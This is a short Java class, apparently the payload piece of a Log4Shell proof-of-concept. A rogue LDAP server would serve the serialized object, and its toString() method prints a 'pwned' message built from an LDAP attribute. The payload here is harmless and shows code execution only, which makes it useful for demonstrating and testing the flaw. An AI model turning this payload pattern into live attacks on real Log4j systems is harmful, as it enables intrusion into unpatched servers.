package log4shell;

import com.unboundid.ldap.sdk.Attribute;
import com.unboundid.ldap.sdk.DN;

import java.io.Serializable;
import java.util.Arrays;

public class ExploitP implements Serializable, WithParams {
  private String message;

  @Override
  public void setParams(DN params) {
    message =
        params == null
            ? ""
            : Arrays.stream(params.getRDNs())
                .flatMap(rdn -> Arrays.stream(rdn.getAttributes()))
                .filter(a -> "msg".equals(a.getName()))
                .map(Attribute::getValue)
                .findFirst()
                .orElse("");
  }

  @Override
  public String toString() {
    System.out.println("You've be pwned (" + message + ") !");
    return "";
  }
}
